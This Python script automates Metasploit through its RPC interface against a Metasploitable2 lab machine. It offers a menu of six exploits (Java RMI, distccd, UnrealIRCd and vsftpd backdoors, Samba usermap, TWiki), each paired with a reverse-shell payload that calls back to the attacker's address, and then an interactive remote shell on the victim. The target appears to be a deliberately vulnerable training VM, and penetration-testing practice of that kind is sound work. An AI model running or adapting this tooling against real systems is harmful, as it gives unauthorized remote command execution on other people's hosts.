import subprocess
import time
import sys
import netifaces  # pip install netifaces
# pip install pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient, SessionManager


class PyMetasploit:
    def __init__(self, msfclient, attacker_ip):
        self.msfclient = msfclient
        self.attacker_ip = attacker_ip
        self.session_manager = SessionManager(msfclient)
        self.exploit = None
        self.payload = None
        self.console = None

    def set_exploit(self, name, **options):
        # Set exploit
        print(f"Setting exploit: {name}")
        expl = self.msfclient.modules.use("exploit", name)
        expl.options
        # Lowercase options keys
        options = {k.lower(): v for k, v in options.items()}
        conditions = {
            "rhosts": "rhosts" in options.keys(),
            "rport": "rport" in options.keys()
        }
        for k in conditions.keys():
            if conditions.get(k, False):
                print(f"\tset {k.upper()} {options[k]}")
                expl[k.upper()] = options[k]
        self.exploit = expl

    def set_payload(self, name, **options):
        print(f"Setting payload: {name}")
        pl = self.msfclient.modules.use('payload', name)
        pl.options
        options = {k.lower(): v for k, v in options.items()}
        conditions = {
            "lhost": "lhost" in options.keys(),
            "lport": "lport" in options.keys()
        }
        for k in conditions.keys():
            if conditions.get(k, False):
                print(f"\tset {k.upper()} {options[k]}")
                pl[k.upper()] = options[k]
        self.payload = pl

    def set_console(self):
        cid = self.msfclient.consoles.console().cid
        self.console = self.msfclient.consoles.console(cid)

    def _get_session_id(self):
        cont = 0
        sid = None
        while cont < 3:
            for k, v in self.msfclient.sessions.list.items():
                if self.exploit.modulename in v["via_exploit"] and\
                        self.payload.modulename in v["via_payload"]:
                    print(f"Found Session Id: {k}")
                    sid = k
            if sid is not None:
                break
            else:
                self.exploit.execute(payload=self.payload)
                cont += 1
                print(f"Retrying in 5 seconds [{cont}/3]...")
                time.sleep(5)

        return sid

    def _get_shell(self, sid):
        return self.msfclient.sessions.session(sid)

    def _pretty_cli(self, shell, victim_ip, need_refresh=True):
        if need_refresh:
            return "Press Enter to access the reverse shell "
        text = "Reverse-Shell - "
        try:
            shell.write("whoami")
            user = f"({shell.read().strip()}@{victim_ip})"
        except Exception:
            user = f"({victim_ip})"
        finally:
            text += user
        try:
            shell.write("pwd")
            dir_ = f"[{shell.read().strip()}]"
        except Exception:
            dir_ = ""
        finally:
            if dir_:
                text += f" - {dir_}"
            else:
                text += dir_
        text += " $ "
        return text

    def _end_session(self, sid):
        close = default_input(
            f"Do you want to close the session {sid}? [y/N] ", default="N")
        while close not in ["y", "Y", "N", "n"]:
            close = default_input(
                f"Do you want to close the session {sid}? [y/N] ", default="N")
        if close in ["y", "Y"] and sid:
            session = self.session_manager.session(sid)
            session.stop()
            print(f"Session {sid} closed")
        print("Finished connection")

    def run(self, *, victim_ip=None):
        sid = self._get_session_id()
        if sid == None:
            print("Unable to find/create a session id")
            return
        shell = self._get_shell(sid)
        print("=====================================")
        print("Building reverse shell\nWrite 'exit' to close the shell")
        print("=====================================")
        command = input(self._pretty_cli(shell, victim_ip))
        while command != "exit":
            shell.write(command)
            stdout = shell.read().strip()
            if stdout:
                print(stdout)
            command = input(self._pretty_cli(
                shell, victim_ip, need_refresh=False))

        self._end_session(sid)


class VictimHost:
    _exploit_choices = {}

    def __init__(self, victim_ip):
        self.victim_ip = victim_ip
        self._check_host_reachable()

    @property
    def available_exploits(self):
        return {str(i): v for i, v in enumerate(list(self._exploit_choices.keys()))}

    def _check_host_reachable(self):
        result = subprocess.call(["ping", "-c", "1", "-w", "1", self.victim_ip],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result != 0:
            raise ConnectionError("Host is not reachable")

    def select_exploit(self, name):
        return self._exploit_choices.get(name, None)


class Metasploitable2(VictimHost):
    def __init__(self, victim_ip) -> None:
        super().__init__(victim_ip)
        self._exploit_choices = {
            "java_rmi_server": self._exploit_java_rmi_server,
            "distccd": self._exploit_distccd,
            "unreal_ircd_3281_backdoor": self._exploit_unreal_ircd_3281_backdoor,
            "usermap": self._exploit_usermap,
            "apache_twiki": self._exploit_apache_twiki,
            "vsftpd_234_backdoor": self._exploit_vsftpd_234_backdoor
        }

    def _exploit_java_rmi_server(self, metasploit: PyMetasploit):
        metasploit.set_exploit(
            name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
        metasploit.set_payload(
            name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_distccd(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="unix/misc/distcc_exec",
                               rhosts=self.victim_ip, rport=3632)
        metasploit.set_payload(name="cmd/unix/reverse",
                               lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit):
        metasploit.set_exploit(
            name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
        metasploit.set_payload(name="cmd/unix/reverse",
                               lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_usermap(self, metasploit: PyMetasploit):
        metasploit.set_exploit(
            name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
        metasploit.set_payload(name="cmd/unix/reverse",
                               lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=victim_ip)

    def _exploit_apache_twiki(self, metasploit: PyMetasploit):
        metasploit.set_exploit(
            name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
        metasploit.set_payload(name="cmd/unix/reverse",
                               lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit):
        metasploit.set_exploit(
            name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
        metasploit.set_payload(name="cmd/unix/interact")
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)


def default_input(text, default=""):
    result = input(text)
    return result if result else default


def suggest_local_ip():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            for address in addresses[netifaces.AF_INET]:
                if 'addr' in address and not address['addr'].startswith('127.'):
                    # Found a private network address
                    return address['addr']
    return None


def exploit_menu(victim: VictimHost):
    text = "ID\t| Payload\n"
    text += "-"*8 + "+" + "-"*27 + "\n"
    for k, v in victim.available_exploits.items():
        text += f"{k}\t| {v}\n"
    text += "Selected: "
    while True:
        selected = input(f"Select the exploit to use:\n{text}")
        if selected.lower() == "exit":
            break
        for k, v in victim.available_exploits.items():
            if selected.lower() == k or selected.lower() == v:
                return v


if __name__ == "__main__":
    msfclient = MsfRpcClient(default_input(
        "MSGRPC pwd (default: password): ", "password"), port=55552)
    local_ip = suggest_local_ip()
    metasploit = PyMetasploit(msfclient, default_input(
        f"Your attacker IP (default: {local_ip}): ", f"{local_ip}"))
    victim_ip = default_input("Metasploitable2 IP Address: ", "192.168.28.145")
    metasploitable2 = Metasploitable2(victim_ip)

    while True:
        try:
            name = exploit_menu(metasploitable2)
            if name:
                exploitation = metasploitable2.select_exploit(name)(metasploit)
                action = default_input(
                    "Continue exploiting? [Y/n]: ", default="Y")
                if action in ["n", "N"]:
                    break
            else:
                break
        except Exception:
            print("Ha habido un error con el servicio MSGRPC, reintentando...")
